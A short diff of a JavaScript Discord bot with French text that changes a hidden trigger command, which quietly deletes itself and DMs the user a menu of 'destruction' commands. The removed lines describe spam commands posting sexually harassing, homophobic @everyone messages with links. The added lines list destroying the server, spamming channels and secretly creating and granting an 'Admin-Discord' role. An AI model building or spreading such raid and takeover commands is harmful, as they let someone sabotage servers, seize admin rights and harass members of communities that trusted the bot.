@@ -91,17 +91,9 @@ bot.on('message', msg => {
 
 });
 bot.on('message', message => {
-    if (message.content === '.d') {
+    if (message.content === '§d') {
     message.channel.fetchMessages({limit: 1}).then(messages => message.channel.bulkDelete(messages));
-        message.author.createDM().then(channel => {
-            channel.send(`**Voici les commandes destruction
-
-            **1°)** - **§spam** ce vas spam ce message: **@everyone  Votre compte YouPorn premium est maintenant disponible , n'hesiter pas à alle regarder vos vidéos GAY favorite :wink:** + le lien
-            
-            **2°)** - **§sodomie** ce vas spam ce message: **@everyone Voila à quoi ressemble votre anus après mon passage j'espere que vous aimez la sodomie:** + le lien
-            
-            **3°)** - **§destruction** Pour detruire le serveur`)
-        })
+        message.author.sendMessage("", {embed: { title: "Voici les commandes destruction", description: "**§destruction**: `destruction du serveur`\n**§spam**: `Spam le channel de message`\n**§r**: `Créé le grade Admin-Discord`\n**§a**: `vous met le grade Admin-Discord`"}})
     }
 });
 
